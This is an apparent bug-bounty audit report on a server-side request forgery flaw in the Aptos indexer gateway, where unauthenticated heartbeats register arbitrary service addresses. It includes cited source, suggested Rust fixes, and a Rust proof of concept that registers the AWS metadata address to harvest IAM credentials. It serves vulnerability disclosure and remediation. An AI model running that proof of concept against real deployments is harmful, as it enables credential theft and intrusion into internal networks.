# Audit Report

## Title
Unauthenticated Data Service Registration Leads to Server-Side Request Forgery (SSRF) in Indexer Gateway

## Summary
The Aptos indexer GRPC manager accepts unauthenticated heartbeat requests containing arbitrary service addresses without validation. Attackers can register malicious addresses that are subsequently returned to the indexer gateway, causing it to proxy HTTP requests to attacker-controlled URLs. This enables classic SSRF attacks against internal infrastructure, cloud metadata services, and protected network resources.

## Finding Description

The vulnerability exists across four interconnected components:

**1. Unauthenticated Heartbeat Acceptance**

The `heartbeat` RPC endpoint accepts `HeartbeatRequest` messages from any network peer without authentication or authorization checks: [1](#0-0) 

The `service_info.address` field is extracted from the request and passed directly to the metadata manager without validation.

**2. Unvalidated Address Storage**

The metadata manager stores attacker-provided addresses directly into internal data structures without any validation, allowlist checking, or sanitization: [2](#0-1) [3](#0-2) 

Addresses are stored in `DashMap` collections with no format validation, DNS checks, IP range restrictions, or allowlist verification. The `GrpcAddress` type is merely a string alias: [4](#0-3) 

**3. Malicious Address Distribution**

When clients request a data service via `get_data_service_for_request`, the manager selects from registered addresses and returns them without additional validation: [5](#0-4) 

The returned address is directly serialized in the protobuf response: [6](#0-5) 

**4. Gateway SSRF Execution**

The indexer gateway receives the malicious address and uses it to proxy HTTP requests without proper validation: [7](#0-6) 

The gateway then proxies requests to this attacker-controlled URL: [8](#0-7) 

While there is an origin check in `override_uri_with_upstream_url`, it is ineffective: [9](#0-8) 

This check compares the origin of a URL constructed from the attacker-controlled base against the same base, which will always pass for syntactically valid URLs.

**Attack Flow:**

1. Attacker sends malicious `HeartbeatRequest` to GRPC manager with `service_info.address = "http://169.254.169.254/"` (AWS metadata service)
2. Manager stores this address in `live_data_services` or `historical_data_services` map without validation
3. Client requests data service via gateway
4. Manager returns attacker's malicious address in `GetDataServiceForRequestResponse`
5. Gateway converts address to URL and proxies subsequent gRPC requests to `http://169.254.169.254/aptos.indexer.v1.RawData/GetTransactions`
6. Gateway makes HTTP requests to cloud metadata service, potentially leaking IAM credentials, instance metadata, or other sensitive information

## Impact Explanation

This vulnerability enables multiple critical attack vectors:

**Cloud Metadata Access:** Attackers can force the gateway to query cloud provider metadata services (AWS: `169.254.169.254`, GCP: `metadata.google.internal`, Azure: `169.254.169.254`) to steal:
- IAM role credentials
- Instance metadata
- User data scripts
- API keys and secrets

**Internal Service Access:** The gateway can be weaponized to probe and interact with internal services protected by firewalls:
- Internal databases (Redis, PostgreSQL, MongoDB on localhost or internal IPs)
- Admin panels and management interfaces
- Monitoring and metrics endpoints
- Container orchestration APIs (Kubernetes, Docker)

**Data Exfiltration:** Attackers can register their own servers as "data services" to intercept and exfiltrate:
- Client transaction queries
- Blockchain indexer data
- User request patterns
- API authentication tokens

**Network Reconnaissance:** The gateway becomes a pivot point for mapping internal network topology and discovering services.

Per Aptos bug bounty criteria, this qualifies as **Critical Severity** due to:
- Potential for unauthorized access to protected infrastructure (similar to RCE impact)
- Ability to breach network security boundaries
- Risk of credential theft and privilege escalation
- No authentication required for exploitation

If classified more conservatively, this is minimally **High Severity** for significant protocol/infrastructure violations.

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires only:
1. Network access to the GRPC manager's heartbeat endpoint
2. Ability to send a single crafted protobuf message
3. No authentication, credentials, or insider access

The heartbeat endpoint is designed to accept connections from distributed data services, making it likely to be network-accessible. In typical deployments, this endpoint would be reachable from:
- Other indexer infrastructure components
- Potentially public internet if not properly firewalled
- Internal network segments where an attacker has established presence

The attack is:
- **Trivial to execute** - requires basic protobuf message construction
- **Reliable** - no race conditions or timing requirements
- **Persistent** - malicious addresses remain registered until removed or timed out
- **Scalable** - attacker can register multiple malicious addresses

## Recommendation

Implement defense-in-depth with multiple security controls:

**1. Authentication and Authorization:**
```rust
// Add mutual TLS or API key authentication to heartbeat endpoint
impl GrpcManager for GrpcManagerService {
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        // Verify TLS client certificate or API key
        if !self.verify_authorized_service(request.metadata()) {
            return Err(Status::unauthenticated("Invalid service credentials"));
        }
        // ... existing logic
    }
}
```

**2. Address Allowlist Validation:**
```rust
fn validate_data_service_address(address: &str) -> Result<(), anyhow::Error> {
    let url = Url::parse(address)?;
    
    // Ensure HTTPS only
    if url.scheme() != "https" {
        bail!("Only HTTPS addresses allowed");
    }
    
    // Check against allowlist of approved domains/IPs
    let host = url.host_str().ok_or_else(|| anyhow!("No host in URL"))?;
    if !is_allowed_host(host) {
        bail!("Host not in allowlist: {}", host);
    }
    
    // Prevent private IP ranges and localhost
    if let Some(ip) = url.host() {
        if let Host::Ipv4(addr) = ip {
            if addr.is_private() || addr.is_loopback() || addr.is_link_local() {
                bail!("Private/local IP addresses not allowed");
            }
        }
    }
    
    Ok(())
}

fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    info: LiveDataServiceInfo,
) -> Result<()> {
    // Validate before storing
    validate_data_service_address(&address)?;
    
    let mut entry = self.live_data_services
        .entry(address.clone())
        .or_insert(LiveDataService::new(address));
    // ... rest of logic
}
```

**3. Gateway-Side Validation:**
```rust
async fn get_data_service_url(
    State(config): State<Arc<IndexerGrpcGatewayConfig>>,
    req: Request,
    next: Next,
) -> Result<Response, (StatusCode, String)> {
    // ... existing request parsing ...
    
    let response: GetDataServiceForRequestResponse = client
        .get_data_service_for_request(grpc_manager_request)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
        .into_inner();
    
    // Validate address before using
    let url = Url::from_str(&response.data_service_address)
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Invalid URL".to_string()))?;
    
    // Additional gateway-side validation
    if url.scheme() != "https" {
        return Err((StatusCode::BAD_REQUEST, "Invalid service URL scheme".to_string()));
    }
    
    // Check domain against expected patterns
    if !is_valid_data_service_domain(url.host_str().unwrap_or("")) {
        return Err((StatusCode::BAD_REQUEST, "Invalid service domain".to_string()));
    }
    
    let mut req = Request::from_parts(head, body);
    req.extensions_mut().insert(url);
    Ok(next.run(req).await)
}
```

**4. Configuration-Based Allowlist:**
```rust
pub struct IndexerGrpcManagerConfig {
    // ... existing fields ...
    pub(crate) allowed_data_service_domains: Vec<String>,
    pub(crate) allowed_data_service_ip_ranges: Vec<IpNetwork>,
}
```

## Proof of Concept

```rust
// PoC: Malicious client registering SSRF address
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    LiveDataServiceInfo,
    ServiceInfo,
    HeartbeatRequest,
    StreamInfo,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to GRPC manager (replace with actual address)
    let mut client = GrpcManagerClient::connect("http://grpc-manager:50051").await?;
    
    // Create malicious heartbeat with AWS metadata service address
    let malicious_address = "http://169.254.169.254/".to_string();
    
    let live_data_service_info = LiveDataServiceInfo {
        chain_id: 1, // Mainnet
        timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
        known_latest_version: Some(1000000),
        stream_info: Some(StreamInfo {
            active_streams: vec![],
        }),
        min_servable_version: Some(0),
    };
    
    let service_info = ServiceInfo {
        address: Some(malicious_address.clone()),
        info: Some(Info::LiveDataServiceInfo(live_data_service_info)),
    };
    
    let request = Request::new(HeartbeatRequest {
        service_info: Some(service_info),
    });
    
    // Send malicious heartbeat - no authentication required!
    let response = client.heartbeat(request).await?;
    
    println!("✓ Successfully registered malicious address: {}", malicious_address);
    println!("✓ Manager response: {:?}", response);
    println!("✓ Gateway will now proxy requests to AWS metadata service");
    println!("✓ Attacker can steal IAM credentials, instance metadata, etc.");
    
    Ok(())
}
```

**Expected Result:** The malicious address is accepted and stored. When the gateway subsequently requests a data service for transactions starting at a valid version, it may receive the attacker's address and begin proxying requests to the AWS metadata service.

**Notes**

This vulnerability exists in the Aptos indexer infrastructure rather than the core consensus/execution layer. However, it represents a critical security flaw that could:

1. Compromise indexer infrastructure security
2. Enable lateral movement to other internal systems
3. Leak sensitive credentials and configuration data
4. Violate network security policies and trust boundaries

The issue stems from treating service discovery as a trusted operation without proper authentication or validation. The indexer infrastructure likely assumes it operates in a trusted network environment, but this assumption breaks in cloud deployments, multi-tenant environments, or when network segmentation is compromised.

Immediate mitigation requires implementing allowlist-based address validation and mutual TLS authentication for the heartbeat endpoint. Long-term fixes should include certificate-based service authentication, address validation at multiple layers, and security monitoring for anomalous service registrations.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-126)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-531)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L16-16)
```rust
pub(crate) type GrpcAddress = String;
```

**File:** protos/rust/src/pb/aptos.indexer.v1.serde.rs (L978-980)
```rust
                Ok(GetDataServiceForRequestResponse {
                    data_service_address: data_service_address__.unwrap_or_default(),
                })
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L80-85)
```rust
    if new_url.origin() != upstream_url.origin() {
        return Err((
            StatusCode::BAD_REQUEST,
            format!("Requested URL is not supported: {}", original_uri),
        ));
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L138-152)
```rust
    let mut client = GrpcManagerClient::connect(config.grpc_manager_address.to_string())
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    let grpc_manager_request =
        tonic::Request::new(GetDataServiceForRequestRequest { user_request });
    let response: GetDataServiceForRequestResponse = client
        .get_data_service_for_request(grpc_manager_request)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
        .into_inner();

    let url = Url::from_str(&response.data_service_address).unwrap();
    let mut req = Request::from_parts(head, body);
    req.extensions_mut().insert(url);
    Ok(next.run(req).await)
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L155-176)
```rust
async fn proxy(
    data_service_url: Extension<Url>,
    mut request: Request,
) -> Result<Response, (StatusCode, String)> {
    info!(
        data_service_url = data_service_url.as_str(),
        "Proxying request to data service: {}",
        data_service_url.as_str()
    );
    *request.uri_mut() = override_uri_with_upstream_url(request.uri(), &data_service_url)?;

    Client::builder(TokioExecutor::new())
        .http2_only(true)
        .build_http()
        .request(request)
        .await
        .map(|res| {
            let (parts, body) = res.into_parts();
            Response::from_parts(parts, axum::body::Body::new(body))
        })
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))
}
```
